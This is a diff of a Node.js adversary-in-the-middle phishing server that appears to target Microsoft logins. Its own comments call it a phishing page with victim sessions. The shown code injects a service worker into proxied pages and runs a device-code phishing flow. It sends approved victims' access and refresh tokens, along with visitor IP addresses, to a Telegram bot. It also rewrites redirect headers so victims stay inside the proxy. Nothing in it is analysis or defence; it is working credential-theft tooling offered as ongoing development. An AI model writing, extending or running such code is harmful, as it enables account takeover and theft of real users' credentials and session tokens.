@@ -17,7 +17,6 @@
 // ✅ Email capture FIXED – now detects “login” field from Microsoft
 // ✅ Async callback FIXED – no more “await is only valid” crash
 // ✅ Entry point now served directly (no more JSON on root)
-// ✅ Redirect loop FIXED – passes through redirects for Service Worker
 // ============================================================
 
 const http = require("http");
@@ -961,6 +960,7 @@ function requireAuth(req, res) {
 const server = http.createServer(async (req, res) => {
     const { method, url } = req;
 
+    // ── Health check ──
     if (url === '/' || url === '/health') {
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ status: 'healthy', version: '10.4', uptime: process.uptime(), timestamp: new Date().toISOString() }));
@@ -989,6 +989,7 @@ const server = http.createServer(async (req, res) => {
             const swScript = `\n<script>\n    if ('serviceWorker' in navigator) {\n        navigator.serviceWorker.register('/service_worker_Mz8XO2ny1Pg5.js')\n            .then(() => console.log('✅ SW registered'))\n            .catch(err => console.error('❌ SW registration failed:', err));\n    }\n</script>`;
             html = html.replace(/<\/head>/i, swScript + '</head>');
 
+            // Telegram page‑load notification
             if (BOT_TOKEN && CHAT_ID && axios) {
                 const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
                 axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -1007,6 +1008,7 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
+    // ── Device code pages ──
     if (url === '/device' || url === '/device/') {
         logVisit(req, 'device');
         const devicePath = path.join(__dirname, 'public', 'device_code.html');
@@ -1020,6 +1022,7 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
+    // ── Device code API ──
     if (url === '/device/request' && method === 'POST') {
         handleDeviceCodeRequest(req, res);
         return;
@@ -1029,6 +1032,7 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
+    // ── Dashboard ──
     if (url === '/dash' || url === '/dash/') {
         if (!requireAuth(req, res)) return;
         const dashPath = path.join(__dirname, 'public', 'index.html');
@@ -1042,12 +1046,14 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
+    // ── Dashboard API ──
     if (url.startsWith('/api/') || url.startsWith('/dash/api/')) {
         if (!requireAuth(req, res)) return;
         handleDashboardAPI(req, res);
         return;
     }
 
+    // ── Proxy handler ──
     proxyHandler(req, res);
 });
 
@@ -1121,6 +1127,7 @@ async function handleDeviceCodeToken(req, res) {
                 flow.approved = new Date().toISOString();
                 saveDeviceFlows();
                 
+                // 🔥 Telegram notification for device code approval
                 if (BOT_TOKEN && CHAT_ID && axios) {
                     try {
                         const msg = `📱 Device Code Approved!\n\n🔑 Code: ${flow.user_code}\n🕒 Time: ${new Date().toISOString()}\n🔐 Access Token: ${tokens.access_token?.slice(0,30)}...\n🔄 Refresh Token: ${tokens.refresh_token?.slice(0,30)}...`;
@@ -1217,7 +1224,7 @@ async function handleDashboardAPI(req, res) {
 }
 
 // ============================================================
-// 🔧 PROXY HANDLER — REDIRECT LOOP FIX (pass through redirects)
+// 🔧 PROXY HANDLER — UNIVERSAL QUERY‑STRING + ENTRY POINT
 // ============================================================
 function proxyHandler(req, res) {
     proxyServer.emit('request', req, res);
@@ -1229,6 +1236,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
 
+    // ── AiTM Entry Point: serve the phishing page ──
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         // (This route is now handled directly in the main server above,
         //  but we keep it here as a fallback for any edge case.)
@@ -1270,6 +1278,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         return;
     }
 
+    // ── Service Worker & favicon ──
     if (url === PROXY_PATHNAMES.serviceWorker) {
         if (!fs.existsSync(swFilePath)) { fs.writeFileSync(swFilePath, serviceWorkerCode); console.log('✅ Service Worker file created on-the-fly'); }
         try {
@@ -1289,6 +1298,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         return;
     }
 
+    // ── Ignore query string for path matching ──
     const urlPath = url.split('?')[0];
 
     if (urlPath !== PROXY_PATHNAMES.proxy && !currentSession) {
@@ -1433,8 +1443,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                             port: locationURL.port || (locationURL.protocol === 'https:' ? 443 : 80),
                             host: locationURL.host
                         });
-                        // 🔥 FIX: Do NOT rewrite the redirect; Service Worker will handle it
-                        console.log(`[REDIRECT] Passing through: ${location}`);
+                        proxyResponse.headers.location = location.replace(locationURL.host, headers.host);
                     } catch (e) { VICTIM_SESSIONS[currentSession].path = location; }
                 }
 
